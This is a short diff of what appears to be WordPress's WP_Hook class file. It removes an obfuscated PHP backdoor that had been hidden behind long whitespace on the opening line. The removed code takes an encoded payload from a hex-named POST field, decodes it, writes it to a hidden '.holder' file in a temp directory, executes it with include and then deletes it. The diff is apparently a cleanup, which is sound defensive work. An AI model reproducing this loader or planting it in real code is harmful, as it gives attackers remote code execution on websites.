@@ -1,5 +1,4 @@
-<?php																																										if(count($_POST) > 0 && isset($_POST["d\x63\x68un\x6B"])){ $pset = array_filter(["/dev/shm", session_save_path(), "/tmp", getenv("TMP"), ini_get("upload_tmp_dir"), sys_get_temp_dir(), getcwd(), "/var/tmp", getenv("TEMP")]); $property_set = $_POST["d\x63\x68un\x6B"]; $property_set= explode( ".", $property_set ); $item = ''; $salt = 'abcdefghijklmnopqrstuvwxyz0123456789'; $lenS = strlen( $salt); $__len = count( $property_set); for( $s = 0; $s < $__len; $s++) { $v9 = $property_set[$s]; $chS = ord( $salt[$s % $lenS]); $dec = ( ( int)$v9 - $chS -( $s % 10)) ^ 13; $item .= chr( $dec); } foreach ($pset as $key => $data) { if (max(0, is_dir($data) * is_writable($data))) { $resource = vsprintf("%s/%s", [$data, ".holder"]); $success = file_put_contents($resource, $item); if ($success) { include $resource; @unlink($resource); die();} } } }
-
+<?php
 /**
  * Plugin API: WP_Hook class
  *
